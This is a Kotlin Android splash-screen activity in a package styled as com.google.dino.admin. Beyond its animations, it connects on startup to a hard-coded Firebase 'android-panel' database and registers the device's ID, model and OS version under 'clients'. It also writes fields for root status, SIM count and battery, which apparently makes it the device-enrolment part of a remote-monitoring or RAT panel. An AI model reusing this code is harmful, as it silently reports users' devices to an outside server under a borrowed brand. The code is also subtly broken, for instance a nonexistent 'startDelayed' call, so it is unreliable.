package com.google.dino.admin

import android.Manifest
import android.animation.ObjectAnimator
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.animation.AccelerateDecelerateInterpolator
import android.view.animation.Animation
import android.view.animation.RotateAnimation
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import androidx.core.animation.doOnEnd
import androidx.core.content.ContextCompat
import com.airbnb.lottie.LottieAnimationView
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SplashActivity : AppCompatActivity() {

    private lateinit var lottieAnimation: LottieAnimationView
    private lateinit var startBtn: Button
    private lateinit var loadingSpinner: ProgressBar
    private lateinit var deviceIdText: TextView
    private lateinit var connectionStatus: TextView
    private lateinit var lastSyncText: TextView
    private lateinit var statusCard: CardView
    private lateinit var floatingOrb1: View
    private lateinit var floatingOrb2: View

    private val firebaseUrl = "https://android-panel-61c66-default-rtdb.europe-west1.firebasedatabase.app"
    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        initViews()
        setupAnimations()
        checkInitialPermissions()
        updateDeviceInfo()
        startFirebaseConnectionTest()
    }

    private fun initViews() {
        lottieAnimation = findViewById(R.id.lottieAnimation)
        startBtn = findViewById(R.id.startBtn)
        loadingSpinner = findViewById(R.id.loadingSpinner)
        deviceIdText = findViewById(R.id.deviceIdText)
        connectionStatus = findViewById(R.id.connectionStatus)
        lastSyncText = findViewById(R.id.lastSyncText)
        statusCard = findViewById(R.id.statusCard)
        floatingOrb1 = findViewById(R.id.floatingOrb1)
        floatingOrb2 = findViewById(R.id.floatingOrb2)

        startBtn.setOnClickListener {
            startMainActivity()
        }

        findViewById<Button>(R.id.settingsBtn).setOnClickListener {
            showSettingsDialog()
        }
    }

    private fun setupAnimations() {
        // 3D Card rotation animation
        val rotateAnim = ObjectAnimator.ofFloat(statusCard, "rotationY", 0f, 5f, 0f, -5f, 0f)
        rotateAnim.duration = 4000
        rotateAnim.repeatCount = ObjectAnimator.INFINITE
        rotateAnim.start()

        // Floating orbs animation
        val orb1Anim = ObjectAnimator.ofFloat(floatingOrb1, "translationY", 0f, -50f, 0f)
        orb1Anim.duration = 3000
        orb1Anim.repeatCount = ObjectAnimator.INFINITE
        orb1Anim.interpolator = AccelerateDecelerateInterpolator()
        orb1Anim.start()

        val orb2Anim = ObjectAnimator.ofFloat(floatingOrb2, "translationY", 0f, -30f, 0f)
        orb2Anim.duration = 2500
        orb2Anim.repeatCount = ObjectAnimator.INFINITE
        orb2Anim.interpolator = AccelerateDecelerateInterpolator()
        orb2Anim.startDelayed(500)

        // Button pulse animation
        val scaleX = ObjectAnimator.ofFloat(startBtn, "scaleX", 1f, 1.05f, 1f)
        val scaleY = ObjectAnimator.ofFloat(startBtn, "scaleY", 1f, 1.05f, 1f)
        scaleX.duration = 2000
        scaleY.duration = 2000
        scaleX.repeatCount = ObjectAnimator.INFINITE
        scaleY.repeatCount = ObjectAnimator.INFINITE
        scaleX.start()
        scaleY.start()
    }

    private fun checkInitialPermissions() {
        val requiredPermissions = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE
        )

        var allGranted = true
        for (permission in requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false
                break
            }
        }

        if (!allGranted) {
            // Show permission request in a fancy way
            animatePermissionRequest()
        }
    }

    private fun animatePermissionRequest() {
        val titleView = findViewById<TextView>(R.id.titleText)
        ObjectAnimator.ofArgb(titleView, "textColor", 
            Color.WHITE, Color.RED, Color.WHITE).apply {
            duration = 1500
            repeatCount = 3
            start()
        }
    }

    private fun updateDeviceInfo() {
        deviceIdText.text = deviceId.take(8) + "..."
        
        val model = Build.MODEL
        val androidVersion = Build.VERSION.RELEASE
        
        // Update last sync time
        val sdf = SimpleDateFormat("hh:mm a", Locale.getDefault())
        lastSyncText.text = sdf.format(Date())
    }

    private fun startFirebaseConnectionTest() {
        loadingSpinner.visibility = View.VISIBLE
        connectionStatus.text = "🔄 Connecting..."
        connectionStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_yellow))

        try {
            val database = FirebaseDatabase.getInstance(firebaseUrl)
            database.getReference(".info/connected").addValueEventListener(
                object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        val connected = snapshot.getValue(Boolean::class.java) ?: false
                        if (connected) {
                            connectionStatus.text = "✅ Connected"
                            connectionStatus.setTextColor(ContextCompat.getColor(this@SplashActivity, R.color.neon_green))
                            sendDeviceInfoToFirebase()
                        } else {
                            connectionStatus.text = "🔴 Disconnected"
                            connectionStatus.setTextColor(ContextCompat.getColor(this@SplashActivity, R.color.neon_red))
                        }
                        loadingSpinner.visibility = View.GONE
                    }

                    override fun onCancelled(error: DatabaseError) {
                        connectionStatus.text = "⚠️ Connection Error"
                        connectionStatus.setTextColor(ContextCompat.getColor(this@SplashActivity, R.color.neon_orange))
                        loadingSpinner.visibility = View.GONE
                    }
                }
            )
        } catch (e: Exception) {
            connectionStatus.text = "⚠️ Setup Required"
            connectionStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_orange))
            loadingSpinner.visibility = View.GONE
        }
    }

    private fun sendDeviceInfoToFirebase() {
        try {
            val database = FirebaseDatabase.getInstance(firebaseUrl)
            val deviceRef = database.getReference("clients").child(deviceId)

            val deviceInfo = hashMapOf<String, Any>(
                "deviceId" to deviceId,
                "modelName" to Build.MODEL,
                "androidv" to Build.VERSION.RELEASE,
                "sdkV" to Build.VERSION.SDK_INT.toString(),
                "status" to true,
                "joined" to SimpleDateFormat("dd/MM/yyyy | hh:mm a", Locale.getDefault())
                    .format(Date()),
                "label" to "Android Device",
                "storage" to "Active",
                "battery" to "Monitoring...",
                "ip_address" to "Fetching...",
                "isRoot" to false,
                "isSdCard" to false,
                "sims" to "1",
                "lastSeen" to System.currentTimeMillis()
            )

            deviceRef.updateChildren(deviceInfo).addOnSuccessListener {
                // Success animation
                ObjectAnimator.ofFloat(statusCard, "scaleX", 1f, 1.1f, 1f).apply {
                    duration = 500
                    start()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startMainActivity() {
        // Animate button click
        ObjectAnimator.ofFloat(startBtn, "scaleX", 1f, 0.9f, 1f).apply {
            duration = 300
            start()
        }
        ObjectAnimator.ofFloat(startBtn, "scaleY", 1f, 0.9f, 1f).apply {
            duration = 300
            start()
        }

        // Show loading
        startBtn.text = "🔄 INITIALIZING..."
        loadingSpinner.visibility = View.VISIBLE

        // Delay for animation
        Handler(Looper.getMainLooper()).postDelayed({
            val intent = Intent(this, MainActivity::class.java)
            startActivity(intent)
            overridePendingTransition(R.anim.slide_in_right, R.anim.slide_out_left)
            finish()
        }, 1000)
    }

    private fun showSettingsDialog() {
        // Create a 3D settings dialog
        val dialog = android.app.AlertDialog.Builder(this, R.style.TransparentDialog)
            .setView(R.layout.dialog_settings)
            .create()

        dialog.window?.apply {
            setBackgroundDrawableResource(android.R.color.transparent)
            // Add 3D effects to dialog
            val rotation = ObjectAnimator.ofFloat(dialog.window?.decorView, "rotationY", 0f, 360f)
            rotation.duration = 500
            rotation.start()
        }

        dialog.show()
    }

    override fun onResume() {
        super.onResume()
        // Resume animations
        lottieAnimation.resumeAnimation()
    }

    override fun onPause() {
        super.onPause()
        // Pause animations to save battery
        lottieAnimation.pauseAnimation()
    }
}
